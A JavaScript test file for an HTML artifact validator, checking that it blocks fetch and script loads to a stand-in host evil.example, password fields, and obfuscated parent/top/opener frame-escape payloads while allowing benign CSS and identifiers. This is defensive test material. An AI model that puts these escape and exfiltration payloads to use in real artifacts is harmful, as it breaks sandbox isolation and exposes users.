const test = require('node:test');
const assert = require('node:assert/strict');
const { validateArtifact } = require('../../src/core/validator');

function artifact(extra = '') {
  return `<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#150b2d;color:#fff}</style></head><body>
  <section data-randomware="loading">Loading</section><section data-randomware="error">Error</section><main data-randomware="interactive"><button id="go">Go</button><pre id="out"></pre></main><footer data-randomware="attribution">Source</footer>
  <script>document.querySelector('#go').addEventListener('click', async () => { const value = await window.randomware.call('open-meteo','forecast',{}); document.querySelector('#out').textContent = String(value); }); window.randomware.ready();</script>${extra}
  ${'x'.repeat(10000)}</body></html>`;
}

function runHtml(html) {
  return validateArtifact(html, { selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }] });
}

function runScript(code) {
  return runHtml(artifact(`<script>${code}</script>`));
}

test('validator accepts a complete artifact with literal selected broker use', () => {
  const result = validateArtifact(artifact(), { selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }] });
  assert.equal(result.ok, true);
  assert.match(result.sha256, /^[a-f0-9]{64}$/);
});

test('validator rejects short artifacts and direct network primitives', () => {
  const short = validateArtifact('<!doctype html><html></html>', { selectedApis: [] });
  assert.equal(short.ok, false);
  assert.equal(short.code, 'artifact_schema');
  const unsafe = validateArtifact(artifact('<script>fetch("https://evil.example")</script>'), {
    selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }]
  });
  assert.equal(unsafe.ok, false);
  assert.equal(unsafe.code, 'policy_blocked');
});

test('validator rejects external resources and credential-like fields', () => {
  const unsafe = validateArtifact(artifact('<script src="https://evil.example/x.js"></script><input type="password" name="login">'), {
    selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }]
  });
  assert.equal(unsafe.ok, false);
  assert.equal(unsafe.code, 'policy_blocked');
});

test('validator accepts the full supported artifact size band', () => {
  for (const target of [10000, 25000, 40000]) {
    const base = artifact(); const padded = base.length < target ? base.replace('</body>', `${'p'.repeat(target - Buffer.byteLength(base, 'utf8'))}</body>`) : base;
    const result = validateArtifact(padded, { selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }] });
    assert.equal(result.ok, true, `target ${target} bytes`);
    assert.ok(result.bytes >= target);
  }
});

test('validator rejects an artifact above the hard byte cap', () => {
  const result = validateArtifact(`${artifact()}${'x'.repeat(30000)}`, { selectedApis: [{ apiId: 'open-meteo', operationIds: ['forecast'] }] });
  assert.equal(result.code, 'artifact_schema');
});

test('validator compares declared API uses with the selected operation contract', () => {
  const selectedApis = [{ apiId: 'open-meteo', operationIds: ['forecast'] }];
  assert.equal(validateArtifact(artifact(), { selectedApis, declaredApiUses: [{ apiId: 'open-meteo', operations: ['forecast'] }] }).ok, true);
  const mismatch = validateArtifact(artifact(), { selectedApis, declaredApiUses: [{ apiId: 'open-meteo', operations: ['not-selected'] }] });
  assert.equal(mismatch.code, 'artifact_schema');
  assert.deepEqual(mismatch.diagnostics, ['declared_api_uses_must_match_selection']);
});

test('validator rejects real parent/top/opener member access, including bracket, whitespace, and optional-chaining obfuscation', () => {
  const escapes = [
    'window.top.location.href="evil"',
    'parent.postMessage(x, "*")',
    'opener.location',
    'top["location"]',
    'window . top . location',
    'parent [ "postMessage" ]',
    'parent?.postMessage(x, "*")',
    'top?.location',
    'window.top?.["location"]',
    'top.focus()',
    'opener.blur()',
    'top.window.location = "https://evil.example"',
    'parent.window.postMessage("x", "*")'
  ];
  for (const escape of escapes) {
    assert.equal(runScript(escape).code, 'policy_blocked', `expected policy_blocked for: ${escape}`);
  }
});

test('validator does not mistake CSS top selectors and transition values for parent/top/opener escapes', () => {
  const cssRules = [
    '.top .page{background:var(--r);color:#fff}',
    '.hud{transition:left .55s ease,top .55s ease}',
    '.hud2{transition:left .24s steps(4,end),top .24s steps(4,end),transform .24s steps(2,end)}'
  ];
  for (const rule of cssRules) {
    const html = artifact().replace('body{background:#150b2d;color:#fff}', `body{background:#150b2d;color:#fff}${rule}`);
    assert.equal(runHtml(html).ok, true, `expected ok:true for CSS rule: ${rule}`);
  }
});

test('validator does not mistake compound English words for the parent/top/opener word boundary', () => {
  const benign = [
    'const value = laptop.location;',
    'showBadge(transparent.name);',
    'grandparent.close();'
  ];
  for (const code of benign) {
    assert.equal(runScript(code).ok, true, `expected ok:true for: ${code}`);
  }
});

test('validator does not exhibit quadratic backtracking on adversarial whitespace runs near parent/top/opener', () => {
  const evil = `top${' '.repeat(28000)}x`;
  const start = process.hrtime.bigint();
  runScript(evil);
  const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
  assert.ok(elapsedMs < 100, `expected well under 100ms for a bounded-whitespace scan, took ${elapsedMs.toFixed(1)}ms`);
});
